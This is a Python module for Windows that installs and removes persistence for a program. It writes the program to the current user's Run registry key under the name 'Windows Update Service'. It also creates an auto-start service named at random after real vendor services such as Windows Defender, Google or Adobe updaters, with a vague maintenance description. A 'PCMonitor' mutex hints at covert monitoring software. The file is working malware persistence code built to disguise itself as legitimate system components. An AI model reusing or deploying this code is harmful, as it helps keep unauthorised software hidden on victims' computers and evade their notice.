"""
Unified Persistence Module
Combines registry and service persistence methods
"""
import sys
import os
import subprocess
import random
import string
from datetime import datetime
from typing import Dict, Optional

# Windows registry support
try:
    import winreg
    REGISTRY_SUPPORT = True
except ImportError:
    REGISTRY_SUPPORT = False

# Windows service support  
try:
    import win32event
    import win32api
    SERVICE_SUPPORT = True
except ImportError:
    SERVICE_SUPPORT = False


class PersistenceManager:
    """Unified persistence management for registry and services"""
    
    def __init__(self):
        self.legitimate_service_names = [
            "WindowsSecurityHealthService", "WindowsUpdateAssistant", 
            "MicrosoftEdgeUpdate", "GoogleUpdateService", "AdobeUpdateService",
            "JavaUpdateScheduler", "WindowsDefenderScheduler", "SystemMaintenanceService"
        ]
        self.mutex_name = "Global\\PCMonitor_Mutex_92847563"
        self._mutex_handle = None
    
    # ========================================
    # REGISTRY PERSISTENCE
    # ========================================
    
    def install_registry_persistence(self, exe_path=None, name="Windows Update Service"):
        """Add program to Windows auto-start registry"""
        if not REGISTRY_SUPPORT:
            print("Registry persistence only available on Windows")
            return False
        
        if exe_path is None:
            exe_path = sys.executable
        
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                reg_path,
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
            print(f"[+] Registry persistence installed: {name}")
            return True
        except Exception as e:
            print(f"[-] Failed to install registry persistence: {e}")
            return False
    
    def remove_registry_persistence(self, name="Windows Update Service"):
        """Remove from auto-start registry"""
        if not REGISTRY_SUPPORT:
            return False
        
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                reg_path,
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.DeleteValue(key, name)
            winreg.CloseKey(key)
            
            print(f"[+] Registry persistence removed: {name}")
            return True
        except Exception as e:
            print(f"[-] Failed to remove registry persistence: {e}")
            return False
    
    def check_registry_persistence(self, name="Windows Update Service"):
        """Check if persistence entry exists"""
        if not REGISTRY_SUPPORT:
            return False
        
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                reg_path,
                0,
                winreg.KEY_READ
            )
            
            value, _ = winreg.QueryValueEx(key, name)
            winreg.CloseKey(key)
            
            return True
        except FileNotFoundError:
            return False
        except Exception:
            return False
    
    # ========================================
    # SERVICE PERSISTENCE
    # ========================================
    
    def install_service_persistence(self, executable_path: str = None, service_name: str = None) -> Dict:
        """Install Windows service for persistence"""
        try:
            if not executable_path:
                executable_path = sys.executable
            
            if not service_name:
                service_name = random.choice(self.legitimate_service_names)
            
            display_name = service_name.replace("Service", " Service")
            description = "System maintenance and security service"
            
            # Create service using sc command
            cmd = [
                'sc', 'create', service_name,
                'binPath=', f'"{executable_path}" --service',
                'DisplayName=', display_name,
                'start=', 'auto',
                'type=', 'own'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                # Set service description
                subprocess.run([
                    'sc', 'description', service_name, description
                ], shell=True)
                
                # Start the service
                start_result = subprocess.run([
                    'sc', 'start', service_name
                ], capture_output=True, text=True, shell=True)
                
                print(f"✓ Service '{service_name}' installed successfully")
                return {
                    "success": True,
                    "service_name": service_name,
                    "display_name": display_name,
                    "executable_path": executable_path,
                    "service_started": start_result.returncode == 0,
                    "method": "sc_command"
                }
            else:
                print(f"✗ Service installation failed: {result.stderr}")
                return {
                    "success": False,
                    "error": f"Service creation failed: {result.stderr}",
                    "return_code": result.returncode
                }
                
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def remove_service_persistence(self, service_name: str) -> Dict:
        """Remove Windows service"""
        try:
            # Stop service first
            subprocess.run(['sc', 'stop', service_name], shell=True)
            
            # Delete service
            result = subprocess.run([
                'sc', 'delete', service_name
            ], capture_output=True, text=True, shell=True)
            
            if result.returncode == 0:
                print(f"✓ Service '{service_name}' removed successfully")
            else:
                print(f"✗ Service removal failed: {result.stderr}")
            
            return {
                "success": result.returncode == 0,
                "service_name": service_name,
                "message": "Service removed" if result.returncode == 0 else result.stderr
            }
            
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def find_and_remove_services(self):
        """Find and remove any of our services"""
        services_to_check = self.legitimate_service_names
        
        for service_name in services_to_check:
            try:
                # Check if service exists
                check_result = subprocess.run(
                    ['sc', 'query', service_name], 
                    capture_output=True, text=True, shell=True
                )
                
                if check_result.returncode == 0:
                    # Service exists, try to remove it
                    result = self.remove_service_persistence(service_name)
                    if result["success"]:
                        return True
            except:
                continue
        
        print("No services found to remove")
        return False
    
    # ========================================
    # MUTEX MANAGEMENT (ANTI-MULTIPLE INSTANCE)
    # ========================================
    
    def check_single_instance(self):
        """Check if another instance is already running"""
        if not SERVICE_SUPPORT:
            return True  # Skip check on non-Windows
        
        try:
            self._mutex_handle = win32event.CreateMutex(None, False, self.mutex_name)
            last_error = win32api.GetLastError()
            
            if last_error == 183:  # ERROR_ALREADY_EXISTS
                print("Another instance is already running!")
                return False
            
            return True
        except Exception as e:
            print(f"Mutex check failed: {e}")
            return True  # Allow execution if check fails
    
    def release_mutex(self):
        """Release the mutex on exit"""
        if self._mutex_handle and SERVICE_SUPPORT:
            try:
                win32api.CloseHandle(self._mutex_handle)
            except:
                pass
    
    # ========================================
    # UNIFIED INTERFACE
    # ========================================
    
    def install_persistence(self, method="registry", **kwargs):
        """Install persistence using specified method"""
        if method == "registry":
            return self.install_registry_persistence(**kwargs)
        elif method == "service":
            return self.install_service_persistence(**kwargs)
        elif method == "both":
            reg_result = self.install_registry_persistence(**kwargs)
            svc_result = self.install_service_persistence(**kwargs)
            return reg_result or svc_result.get("success", False)
        else:
            print(f"Unknown persistence method: {method}")
            return False
    
    def remove_persistence(self, method="both", **kwargs):
        """Remove persistence using specified method"""
        results = []
        
        if method in ["registry", "both"]:
            results.append(self.remove_registry_persistence(**kwargs))
        
        if method in ["service", "both"]:
            results.append(self.find_and_remove_services())
        
        return any(results)
    
    def check_persistence(self, method="both", **kwargs):
        """Check if persistence is installed"""
        if method == "registry":
            return self.check_registry_persistence(**kwargs)
        elif method == "service":
            # Would need to implement service checking
            return False
        elif method == "both":
            return (self.check_registry_persistence(**kwargs) or 
                   False)  # Service check would go here
        else:
            return False


# Global persistence manager instance
persistence_manager = PersistenceManager()

# Legacy function compatibility
def install_registry_persistence(exe_path=None, name="Windows Update Service"):
    """Legacy interface for registry persistence"""
    return persistence_manager.install_registry_persistence(exe_path, name)

def remove_registry_persistence(name="Windows Update Service"):
    """Legacy interface for registry persistence removal"""
    return persistence_manager.remove_registry_persistence(name)

def check_registry_persistence(name="Windows Update Service"):
    """Legacy interface for registry persistence check"""
    return persistence_manager.check_registry_persistence(name)

def install_service():
    """Legacy interface for service installation"""
    result = persistence_manager.install_service_persistence()
    
    if result["success"]:
        print(f"Service installed: {result['service_name']}")
        print("Service will start automatically on boot")
    else:
        print(f"Service installation failed: {result.get('error', 'Unknown error')}")
    
    return result["success"]

def remove_service():
    """Legacy interface for service removal"""
    return persistence_manager.find_and_remove_services()

def check_single_instance():
    """Legacy interface for mutex check"""
    return persistence_manager.check_single_instance()

def release_mutex():
    """Legacy interface for mutex release"""
    return persistence_manager.release_mutex()